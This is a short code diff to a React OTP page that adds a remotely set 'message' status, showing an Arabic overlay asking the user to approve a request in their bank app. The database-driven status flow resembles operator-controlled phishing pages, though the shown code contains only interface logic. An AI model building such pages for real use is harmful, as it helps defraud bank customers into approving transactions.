@@ -45,7 +45,9 @@ export default function FinalOtpPage() {
         const data = snap.data()
         const s = data.finalOtpStatus as string | undefined
 
-        if (s === "verifying") {
+        if (s === "message") {
+          setStatus("message")
+        } else if (s === "verifying") {
           setStatus("verifying")
         } else if (s === "approved") {
           setStatus("approved")
@@ -143,6 +145,30 @@ export default function FinalOtpPage() {
     <>
       {verifying && (
         <UnifiedSpinner message="جاري التحقق" submessage="الرجاء الانتظار..." />
+      )}
+
+      {status === "message" && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#0a4a68]/95" dir="rtl">
+          <div className="text-center space-y-6 px-8">
+            <div className="relative mx-auto flex h-24 w-24 items-center justify-center">
+              <div className="absolute h-24 w-24 animate-ping rounded-full border-4 border-yellow-400/30" />
+              <div className="absolute h-20 w-20 rounded-full border-4 border-yellow-400/50" />
+              <div className="flex h-14 w-14 items-center justify-center rounded-full bg-yellow-400/20">
+                <Smartphone className="h-8 w-8 text-yellow-400" />
+              </div>
+            </div>
+            <div className="space-y-3">
+              <p className="text-xl font-bold leading-relaxed text-white">
+                الرجاء الدخول لتطبيق البنك الخاص بك والموافقة
+              </p>
+              <div className="flex items-center justify-center gap-2">
+                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "0ms" }} />
+                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "150ms" }} />
+                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "300ms" }} />
+              </div>
+            </div>
+          </div>
+        </div>
       )}
 
       <StepShell
